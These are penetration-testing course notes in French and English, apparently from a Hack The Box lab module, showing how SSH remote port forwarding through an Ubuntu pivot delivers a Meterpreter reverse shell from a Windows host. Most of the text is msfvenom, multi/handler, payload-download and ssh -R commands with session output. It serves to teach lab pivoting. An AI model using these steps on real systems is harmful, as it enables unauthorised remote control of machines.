# Remote/Reverse Port Forwarding with SSH

***

Nous avons vu le transfert de port local, où SSH peut écouter sur notre machine locale et rediriger un service du serveur distant vers un port de notre machine, ainsi que le transfert de port dynamique, qui nous permet d'envoyer des paquets vers un réseau distant via une machine pivot. Mais parfois, nous souhaitons également rediriger un service local vers un port distant. Prenons le scénario où nous pouvons utiliser le protocole RDP pour nous connecter à la machine Windows A. Comme on peut le voir sur l'image ci-dessous, dans notre cas précédent, nous pouvions pivoter vers la machine Windows via le serveur Ubuntu

![](https://academy.hackthebox.com/storage/modules/158/33.png)

<mark style="color:orange;">**Mais que se passe-t-il si nous essayons d'obtenir un reverse shell ?**</mark>

La connexion sortante de l'hôte Windows est limitée au réseau **172.16.5.0/23**. Cela s'explique par le fait que l'hôte Windows n'a aucune connexion directe avec le réseau auquel se trouve l'hôte d'attaque. Ainsi, si nous lançons un listener Metasploit sur notre hôte d'attaque et tentons d'obtenir un reverse shell, nous ne pourrons pas établir une connexion directe, car le serveur Windows ne sait pas comment router le trafic quittant son réseau (172.16.5.0/23) pour atteindre le réseau **10.129.x.x** (le réseau du laboratoire de l'Académie).

Il arrive souvent, lors d'un test d'intrusion, que se contenter d'une simple connexion en bureau à distance (RDP) ne soit pas suffisant. Vous pourriez vouloir télécharger ou téléverser des fichiers (surtout si le presse-papiers RDP est désactivé), utiliser des exploits ou exploiter des API Windows bas niveau via une session Meterpreter pour réaliser une reconnaissance sur l'hôte Windows, ce qui n'est pas possible en utilisant les exécutables Windows natifs.

Dans ces cas-là, nous devons trouver un **hôte pivot** — un point de connexion commun entre notre hôte d'attaque et le serveur Windows. Dans notre scénario, l'hôte pivot sera le serveur Ubuntu, car il peut se connecter à la fois à notre hôte d'attaque et à la cible Windows.

Pour obtenir une session Meterpreter sur Windows, nous allons créer une charge utile (payload) Meterpreter HTTPS à l'aide de **msfvenom**. Cependant, la configuration de la connexion inverse (reverse connection) pour ce payload utilisera l'adresse IP du serveur Ubuntu (172.16.5.129). Nous utiliserons le port **8080** sur le serveur Ubuntu pour transférer tous nos paquets de reverse shell vers le port **8000** de notre hôte d'attaque, où notre listener Metasploit est en cours d'exécution.

<mark style="color:green;">**Creating a Windows Payload with msfvenom**</mark>

{% code overflow="wrap" fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```
{% endcode %}

<mark style="color:green;">**Configuring & Starting the multi/handler**</mark>

```shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
lport => 8000
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:8000
```

Once our payload is created and we have our listener configured & running, we can copy the payload to the Ubuntu server using the `scp` command since we already have the credentials to connect to the Ubuntu server using SSH.

<mark style="color:green;">**Transferring Payload to Pivot Host**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ scp backupscript.exe ubuntu@<ipAddressofTarget>:~/

backupscript.exe                                   100% 7168    65.4KB/s   00:00 
```

After copying the payload, we will start a `python3 HTTP server` using the below command on the Ubuntu server in the same directory where we copied our payload.

<mark style="color:green;">**Starting Python3 Webserver on Pivot Host**</mark>

```shell-session
ubuntu@Webserver$ python3 -m http.server 8123
```

<mark style="color:green;">**Downloading Payload on the Windows Target**</mark>

We can download this `backupscript.exe` on the Windows host via a web browser or the PowerShell cmdlet `Invoke-WebRequest`.

{% code overflow="wrap" fullWidth="true" %}
```powershell-session
PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```
{% endcode %}

{% hint style="warning" %}
Once we have our payload downloaded on the Windows host, we will use `SSH remote port forwarding` to forward connections from the Ubuntu server's port 8080 to our msfconsole's listener service on port 8000. We will use `-vN` argument in our SSH command to make it verbose and ask it not to prompt the login shell. The `-R` command asks the Ubuntu server to listen on `<targetIPaddress>:8080` and forward all incoming connections on port `8080` to our msfconsole listener on `0.0.0.0:8000` of our `attack host`.
{% endhint %}

<mark style="color:green;">**Using SSH -R**</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```
{% endcode %}

After creating the SSH remote port forward, we can execute the payload from the Windows target. If the payload is executed as intended and attempts to connect back to our listener, we can see the logs from the pivot on the pivot host.

<mark style="color:green;">**Viewing the Logs from the Pivot**</mark>

{% code fullWidth="true" %}
```shell-session
ebug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61355
debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=5
debug1: channel 1: new [172.16.5.19]
debug1: confirm forwarded-tcpip
debug1: channel 0: free: 172.16.5.19, nchannels 2
debug1: channel 1: connected to 0.0.0.0 port 8000
debug1: channel 1: free: 172.16.5.19, nchannels 1
debug1: client_input_channel_open: ctype forwarded-tcpip rchan 2 win 2097152 max 32768
debug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61356
debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=4
debug1: channel 0: new [172.16.5.19]
debug1: confirm forwarded-tcpip
debug1: channel 0: connected to 0.0.0.0 port 8000
```
{% endcode %}

If all is set up properly, we will receive a Meterpreter shell pivoted via the Ubuntu server.

<mark style="color:green;">**Meterpreter Session Established**</mark>

{% code fullWidth="true" %}
```shell-session
[*] Started HTTPS reverse handler on https://0.0.0.0:8000
[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
[*] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Staging x64 payload (201308 bytes) ...
[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (127.0.0.1:8000 -> 127.0.0.1 ) at 2022-03-02 10:48:10 -0500

meterpreter > shell
Process 3236 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>
```
{% endcode %}

Our Meterpreter session should list that our incoming connection is from a local host itself (`127.0.0.1`) since we are receiving the connection over the `local SSH socket`, which created an `outbound` connection to the Ubuntu server. Issuing the `netstat` command can show us that the incoming connection is from the SSH service.

![](https://academy.hackthebox.com/storage/modules/158/44.png)
